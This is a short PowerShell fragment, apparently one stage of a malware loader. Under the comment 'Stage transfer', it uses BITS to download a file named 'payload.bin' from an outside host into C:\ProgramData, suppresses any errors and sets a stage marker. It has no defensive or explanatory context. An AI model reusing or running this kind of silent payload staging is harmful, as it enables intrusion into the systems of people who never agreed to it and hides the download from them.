
<# Stage transfer #> Start-BitsTransfer -Source 'https://internal.corp:443/payload.bin' -Destination 'C:\ProgramData\payload.bin' -ErrorAction SilentlyContinue; Set-Location -Path $env:TEMP; $StageMarker = "stage-21"
